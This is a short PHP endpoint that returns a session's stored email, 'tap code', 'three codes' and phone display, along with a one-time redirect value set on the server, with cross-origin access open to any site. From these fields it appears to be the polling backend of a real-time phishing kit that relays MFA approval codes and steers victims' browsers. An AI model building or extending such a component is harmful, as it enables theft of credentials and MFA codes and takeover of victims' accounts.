<?php
require_once __DIR__ . '/config.php';
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Cache-Control: no-cache, no-store, must-revalidate');

$sessionId = $_GET['session_id'] ?? '';
if (empty($sessionId)) {
    echo json_encode(['redirect' => '', 'error' => 'No session ID']);
    exit;
}

$sessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
$data = getSessionData($sessionId);

$result = [
    'redirect' => '',
    'email' => $data['email'] ?? '',
    'tap_code_value' => $data['tap_code_value'] ?? '',
    'three_codes_value' => $data['three_codes_value'] ?? '',
    'phone_display' => $data['phone_display'] ?? ''
];

if (!empty($data['redirect'])) {
    $result['redirect'] = $data['redirect'];
    $data['redirect'] = '';
    updateSessionData($sessionId, $data);
}

echo json_encode($result);
?>